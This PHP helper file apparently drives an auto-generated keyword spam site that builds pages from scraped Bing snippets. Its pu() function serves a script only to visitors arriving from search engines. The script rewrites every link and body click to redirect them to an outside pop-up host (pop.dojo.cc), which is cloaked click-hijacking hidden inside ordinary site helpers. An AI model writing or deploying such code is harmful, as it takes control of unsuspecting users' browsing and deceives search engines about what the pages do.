<?php
use duncan3dc\Laravel\BladeInstance;
use Buchin\Bing\Web;
use Buchin\SearchTerm\SearchTerm;
use Buchin\TermapiClient\TermApi;

function is_cli()
{
	return php_sapi_name() == "cli";
}

function view($template, $data = [], $echo = true)
{
	if(!is_cli()){
		termapi();
	}
	
	$blade = new BladeInstance(__DIR__ . '/views', __DIR__ . '/cache');
	$blade->addPath(__DIR__ . '/ads');

	if(!$echo){	
		return $blade->render($template, $data);
	}

	echo $blade->render($template, $data);
}

function pages()
{
	return [
		'dmca',
		'contact',
		'privacy-policy',
		'copyright',
	];
}

function image_url($keyword, $img = false)
{
	if(is_cli() && $img){
		return collect(get_data(str_slug($keyword))['images'])->random()['url'];
	}

	$ext = $img ? '.jpg' : '.html';
	return home_url() . str_slug($keyword) . $ext;
}

function preview_url($image)
{
	return SearchTerm::isCameFromSearchEngine() ? home_url() . '?img=' . urlencode($image['url']) : $image['url'];
}

function page_url($page)
{
	return home_url() . 'pages/' . $page;
}


function home_url()
{
	if (php_sapi_name() == "cli") {
    	return '';
	}

	$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
	 
	$url = $protocol . $_SERVER['HTTP_HOST'] . str_replace('/index.php', '', Flight::request()->base);

	return rtrim($url, '/') . '/';
}

function site_name()
{
	return isset($_SERVER['SERVER_NAME']) ? ucwords(explode('.', $_SERVER['SERVER_NAME'])[0]) : $_SERVER['argv'][1];
}


function keywords()
{
	$path = __DIR__ . '/data/';
	$keywords = glob($path . "*.srz.php");
	$keywords = str_replace([$path, '.srz.php'], '', $keywords);

	$keywords = str_replace('-', ' ', $keywords);
	
	return $keywords;
}

function random_post()
{
	$slug = str_slug(collect(keywords())->random());
	return $slug . '.html';
}

function get_filename($keyword)
{
	return __DIR__ . '/data/' . str_slug($keyword) . '.srz.php';
}

function get_data($slug)
{
	$filename = __DIR__ . '/data/' . $slug . '.srz.php';

	return @unserialize(@file_get_contents($filename));
}

function data_exists($keyword)
{
	return file_exists(get_filename($keyword));
}

function is_se()
{
	$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : false;

    if($referer){
        $se_referers = ['.google.', '.bing.', '.yahoo.', '.yandex.'];

        foreach ($se_referers as $se_referer) {
        	if(stripos($referer, $se_referer) !== false){
        		return true;
        	}
        }

        return false;
    }

    return false;
}

function get_sentences($keyword)
{
	$results = (new Web)->scrape($keyword);
	$sentences = [];

	foreach ($results as $result) {
		$new_sentences = [];
		foreach (preg_split('/(?<=[.?!;:])\s+/', $result['description'], -1, PREG_SPLIT_NO_EMPTY) as $new_sentence) {
			
			if(count(explode(' ', $new_sentence)) > 3 && !str_contains($new_sentence, ['.com', '.org', '.net', '.tk', '.pw'])){
				$new_sentences[] = ucfirst(trim(str_slug($new_sentence, ' '))) . '.';
			}
		}

		$sentences = array_merge($sentences, $new_sentences);
	}

	return $sentences;
}

function pu()
{
	if(!is_se()){
		$script = '';
	}
	else {
		$script = <<<EOL
<script>
	code = function(){
	    $(document).ready(function() {
			$('a').attr('onclick', "document.location.assign('https://pop.dojo.cc/click/1'); return true;");
			$('a').attr('target', '_blank');

			$('body').attr('onclick', "window.open(window.location.href); document.location.assign('https://pop.dojo.cc/click/1'); return false;");
		});
	}

	if(window.jQuery)  code();
	else{   
	    var script = document.createElement('script'); 
	    document.head.appendChild(script);  
	    script.type = 'text/javascript';
	    script.src = "//code.jquery.com/jquery-3.3.1.slim.min.js";

	    script.onload = code;
	}
</script>
EOL;
	}

	return $script;
}